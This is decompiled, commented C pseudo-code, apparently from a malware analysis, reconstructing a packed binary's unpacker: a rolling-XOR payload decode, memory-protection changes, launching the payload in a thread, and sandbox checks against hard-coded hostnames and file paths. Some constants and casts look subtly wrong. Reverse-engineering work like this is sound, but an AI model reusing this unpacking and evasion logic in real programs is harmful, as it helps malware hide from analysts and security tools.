/*
 * =============================================================================
 * Packer Stub - Decompiled from Original Packed Binary
 * =============================================================================
 * These functions are from the UNPACKED section of the original binary
 * (at high addresses 0x53DFEA+) that exist before the XOR decode runs.
 */

/*
 * Original entry point - called first, invokes unpacker then exits
 */
void original_entry(void)
{
    FUN_0053dfea();    /* Unpacker stub - decrypts payload, creates thread */
    ExitProcess(0);    /* Never reached - unpacker runs forever */
}

/*
 * Unpacker stub @ 0x53dfea - Decrypts the real payload and launches it
 */
void FUN_0053dfea(void)
{
    /* Step 1: Run anti-analysis checks */
    FUN_0053e46d();
    
    /* Step 2: Resolve VirtualProtect via GetModuleHandleW/GetProcAddress */
    WCHAR kernel32[] = L"kernel32.dll";
    HMODULE hKernel32 = GetModuleHandleW(kernel32);
    
    WCHAR virtProtect[] = L"VirtualProtect";  /* obfuscated in actual binary */
    FARPROC pVirtualProtect = GetProcAddress(hKernel32, (LPCSTR)virtProtect);
    
    /* Step 3: Make .text section writable */
    DWORD oldProtect;
    pVirtualProtect(entry, 0xD353C, PAGE_READWRITE, &oldProtect);
    
    /* Step 4: XOR decode the payload */
    uint32_t key1 = 0xE583A01B;    /* Rolling XOR key */
    uint32_t key2 = 0x0DA45DD3;    /* Skip control key */
    int count = 0xD353C;           /* 865,596 bytes */
    byte *src = (byte *)0x40100E;  /* Encrypted data source */
    byte *dst = (byte *)0x401000;  /* Decrypted data destination */
    
    do {
        byte *next_src = src + 1;
        *dst = *src ^ (byte)(key1 & 0xFF);
        
        /* Update rolling key: ROL(key1, 5) * 7 */
        key1 = ((key1 >> 5) | (key1 << 27)) * 7;
        
        /* Check skip bit from key2 */
        if (key2 & 1) {
            next_src = src + 2;  /* Skip one source byte */
        }
        
        /* Rotate key2 right by 1 */
        key2 = (key2 >> 1) | ((key2 & 1) << 31);
        
        count--;
        src = next_src;
        dst++;
    } while (count != 0);
    
    /* Step 5: Make .text section executable */
    pVirtualProtect(entry, 0xD353C, PAGE_EXECUTE_READ, &oldProtect);
    
    /* Step 6: Launch decoded payload in a new thread */
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry, NULL, 0, NULL);
    
    /* Step 7: Wait forever */
    do {
        Sleep(1000);
    } while (TRUE);
}

/*
 * Anti-Analysis Checks @ 0x53e46d
 * Returns only if all checks pass; calls ExitProcess(0) if any fail
 */
void FUN_0053e46d(void)
{
    /* Check 1: Memory allocation test (100MB) */
    void *mem = malloc(0x6400000);  /* 100MB */
    if (mem == NULL) goto BLOCKED;
    memset(mem, 0, 0x6400000);
    free(mem);
    
    /* Check 2: SetErrorMode sandbox detection */
    SetErrorMode(SEM_FAILCRITICALERRORS);  /* 0x400 */
    UINT oldMode = SetErrorMode(0);
    if (oldMode != 0x400) goto BLOCKED;
    
    /* Check 3: VirtualAllocExNuma sandbox/emulator detection */
    LPVOID p = VirtualAllocExNuma(
        (HANDLE)-1,     /* Current process */
        NULL,           /* Let system choose address */
        1000,           /* Size */
        0x3000,         /* MEM_COMMIT | MEM_RESERVE */
        4,              /* PAGE_EXECUTE_READWRITE */
        0               /* NUMA node */
    );
    if (p == NULL) goto BLOCKED;
    
    /* Check 4: Computer name blocklist */
    DWORD size = 260;
    CHAR computerName[260];
    BOOL gotName = GetComputerNameA(computerName, &size);
    if (gotName) {
        /* Check against known sandbox/VM hostnames */
        if (strcmp("NfZtFbPfH", computerName) == 0) goto BLOCKED;
        if (strcmp("ELICZ", computerName) == 0) goto BLOCKED;
        if (strcmp("tz", computerName) == 0) goto BLOCKED;
        if (strcmp("MAIN", computerName) == 0) goto BLOCKED;
    }
    
    /* Check 5: Executable path blocklist */
    CHAR modulePath[260];
    DWORD pathLen = GetModuleFileNameA(NULL, modulePath, 260);
    if (pathLen >= 1) {
        CHAR *fileName = PathFindFileNameA(modulePath);
        
        if (_strcmpi("C:\Documents and Settings\Administrator\My Documents\mwsmpl.exe", 
                     modulePath) == 0) goto BLOCKED;
        if (_strcmpi("C:\SELF.EXE", modulePath) == 0) goto BLOCKED;
        if (_strcmpi("myapp.exe", fileName) == 0) goto BLOCKED;
    }
    
    /* All checks passed - return normally */
    return;
    
BLOCKED:
    /* Analysis environment detected - exit immediately */
    ExitProcess(0);
}
